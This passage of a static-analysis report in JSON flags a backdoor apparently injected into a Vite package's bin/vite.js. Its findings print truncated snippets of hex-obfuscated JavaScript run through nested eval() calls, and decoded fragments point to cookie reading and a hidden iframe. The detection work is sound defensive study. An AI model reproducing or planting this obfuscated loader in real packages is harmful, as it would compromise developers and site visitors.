\"\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x39\\x33\\x62\\x37\\x64\\x37\\x64\\x22\\x3b\\x66\\x6f\\x72\\x20\\x28\\x76\\x61\\x72\\x20\\x64\\x74\\x65\\x66\\x68\\x3d\\x30\\x3b\\x64\\x74\\x65\\x66\\x68\\x3c\\x66\\x65\\x69\\x64\\x64\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x3b\\x64\\x74\\x65\\x66\\x68\\x2b\\x3d\\x32\\x29\\x7b\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61",
                    "rendered": {
                      "text": "\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\", \"\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x32\\x32\\x65\\x36\\x35\\x37\\x38\\x36\\x35\\x36\\x33\\x32\\x38\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x30\\x35\\x64\\x32\\x65\\x37\\x33\\x37\\x30\\x36\\x63\\x36\\x39\\x37\\x34\\x32\\x38\", \"\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x39\\x33\\x62\\x37\\x64\\x37\\x64\\x22\\x3b\\x66\\x6f\\x72\\x20\\x28\\x76\\x61\\x72\\x20\\x64\\x74\\x65\\x66\\x68\\x3d\\x30\\x3b\\x64\\x74\\x65\\x66\\x68\\x3c\\x66\\x65\\x69\\x64\\x64\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x3b\\x64\\x74\\x65\\x66\\x68\\x2b\\x3d\\x32\\x29\\x7b\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61",
                      "markdown": "`\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\", \"\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x32\\x32\\x65\\x36\\x35\\x37\\x38\\x36\\x35\\x36\\x33\\x32\\x38\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x30\\x35\\x64\\x32\\x65\\x37\\x33\\x37\\x30\\x36\\x63\\x36\\x39\\x37\\x34\\x32\\x38\", \"\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x39\\x33\\x62\\x37\\x64\\x37\\x64\\x22\\x3b\\x66\\x6f\\x72\\x20\\x28\\x76\\x61\\x72\\x20\\x64\\x74\\x65\\x66\\x68\\x3d\\x30\\x3b\\x64\\x74\\x65\\x66\\x68\\x3c\\x66\\x65\\x69\\x64\\x64\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x3b\\x64\\x74\\x65\\x66\\x68\\x2b\\x3d\\x32\\x29\\x7b\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 503,
                  "endLine": 4,
                  "endColumn": 931,
                  "snippet": {
                    "text": "\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x63\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\", \"\\x32\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x32\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\", \"\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x32\\x32\\x65\\x36\\x35\\x37\\x38\\x36\\x35\\x36\\x33\\x32\\x38\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32",
                    "rendered": {
                      "text": "\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x63\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\", \"\\x32\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x32\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\", \"\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x32\\x32\\x65\\x36\\x35\\x37\\x38\\x36\\x35\\x36\\x33\\x32\\x38\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32",
                      "markdown": "`\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x63\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\", \"\\x32\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x32\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\", \"\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x32\\x32\\x65\\x36\\x35\\x37\\x38\\x36\\x35\\x36\\x33\\x32\\x38\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 71,
                  "endLine": 4,
                  "endColumn": 499,
                  "snippet": {
                    "text": "#!/usr/bin/env node\nimport { performance } from 'node:perf_hooks'\n\nwindow[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"] = [\"\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x63\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\", \"\\x32\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x32\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33",
                    "rendered": {
                      "text": "#!/usr/bin/env node\nimport { performance } from 'node:perf_hooks'\n\nwindow[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"] = [\"\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x63\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\", \"\\x32\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x32\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33",
                      "markdown": "`#!/usr/bin/env node\nimport { performance } from 'node:perf_hooks'\n\nwindow[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"] = [\"\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x63\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\", \"\\x32\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x32\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 44,
                  "endLine": 4,
                  "endColumn": 64,
                  "snippet": {
                    "text": "#!/usr/bin/env node\nimport { performance } from 'node:perf_hooks'\n\nwindow[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"] = [\"\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x63\\x32\\x32\\x33\\x34\\",
                    "rendered": {
                      "text": "#!/usr/bin/env node\nimport { performance } from 'node:perf_hooks'\n\nwindow[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"] = [\"\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x63\\x32\\x32\\x33\\x34\\",
                      "markdown": "`#!/usr/bin/env node\nimport { performance } from 'node:perf_hooks'\n\nwindow[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"] = [\"\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x63\\x32\\x32\\x33\\x34\\`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 8,
                  "endLine": 4,
                  "endColumn": 40,
                  "snippet": {
                    "text": "#!/usr/bin/env node\nimport { performance } from 'node:perf_hooks'\n\nwindow[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"] = [\"\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\",
                    "rendered": {
                      "text": "#!/usr/bin/env node\nimport { performance } from 'node:perf_hooks'\n\nwindow[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"] = [\"\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\",
                      "markdown": "`#!/usr/bin/env node\nimport { performance } from 'node:perf_hooks'\n\nwindow[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"] = [\"\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 7435,
                  "endLine": 4,
                  "endColumn": 7863,
                  "snippet": {
                    "text": "\\x61\\x32\\x64\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x37\\x30\\x37\\x38\\x33\\x62\\x36\\x63\\x36\\x35\\x36\\x36\\x37\\x34\\x33\\x61\\x32\\x64\\x33\\x39\\x33\\x39\\x33\\x39\\x33\\x39\\x37\\x30\\x37\\x38\\x33\\x62\\x32\\x37\\x33\\x65\\x33\\x63\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x32\\x30\\x37\\x33\\x37\\x32\\x36\\x33\\x33\\x64\\x32\\x37\\x32\", \"\\x32\\x38\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x32\\x31\\x33\\x64\\x32\\x30\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x39\\x37\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x",
                    "rendered": {
                      "text": "\\x61\\x32\\x64\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x37\\x30\\x37\\x38\\x33\\x62\\x36\\x63\\x36\\x35\\x36\\x36\\x37\\x34\\x33\\x61\\x32\\x64\\x33\\x39\\x33\\x39\\x33\\x39\\x33\\x39\\x37\\x30\\x37\\x38\\x33\\x62\\x32\\x37\\x33\\x65\\x33\\x63\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x32\\x30\\x37\\x33\\x37\\x32\\x36\\x33\\x33\\x64\\x32\\x37\\x32\", \"\\x32\\x38\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x32\\x31\\x33\\x64\\x32\\x30\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x39\\x37\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x",
                      "markdown": "`\\x61\\x32\\x64\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x37\\x30\\x37\\x38\\x33\\x62\\x36\\x63\\x36\\x35\\x36\\x36\\x37\\x34\\x33\\x61\\x32\\x64\\x33\\x39\\x33\\x39\\x33\\x39\\x33\\x39\\x37\\x30\\x37\\x38\\x33\\x62\\x32\\x37\\x33\\x65\\x33\\x63\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x32\\x30\\x37\\x33\\x37\\x32\\x36\\x33\\x33\\x64\\x32\\x37\\x32\", \"\\x32\\x38\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x32\\x31\\x33\\x64\\x32\\x30\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x39\\x37\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = 